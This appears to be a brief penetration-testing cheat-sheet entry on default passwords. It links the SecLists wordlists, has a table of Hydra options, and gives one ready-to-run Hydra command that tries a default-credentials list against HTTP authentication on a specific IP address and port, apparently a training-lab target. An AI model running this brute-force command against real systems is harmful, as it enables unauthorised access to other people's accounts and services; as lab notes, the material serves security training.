# Default Passwords

{% embed url="https://github.com/danielmiessler/SecLists" %}

| Options                            | Description                   |
| ---------------------------------- | ----------------------------- |
| `-C ftp-betterdefaultpasslist.txt` | Combined Credentials Wordlist |
| `SERVER_IP`                        | Target IP                     |
| `-s PORT`                          | Target Port                   |
| `http-get`                         | Request Method                |
| `/`                                | Target Path                   |

{% code overflow="wrap" %}
```
hydra -C /usr/share/seclists/Passwords/Default-Credentials/ssh-betterdefaultpasslist.txt 83.136.253.102 -s 51865 http-get /
```
{% endcode %}
